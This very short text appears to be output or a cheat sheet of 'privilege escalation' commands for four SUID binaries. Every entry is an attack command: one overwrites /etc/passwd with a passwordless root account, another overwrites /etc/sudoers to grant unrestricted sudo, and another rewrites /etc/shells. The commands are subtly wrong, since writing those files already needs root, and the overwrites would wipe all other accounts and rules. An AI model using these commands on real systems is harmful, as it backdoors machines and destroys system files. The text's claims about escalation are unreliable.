# Relevant privilege escalation code for SUID binaries found:

# /usr/bin/passwd
echo "toor:supersecret" | /usr/bin/passwd

# /usr/sbin/pppd
echo rootme::0:0:/root:/bin/bash > /etc/passwd
/usr/sbin/pppd

# /usr/bin/sudo
echo "toor ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers
/usr/bin/sudo su -

# /usr/bin/chsh
echo "/bin/bash" > /etc/shells
/usr/bin/chsh -s /bin/bash root
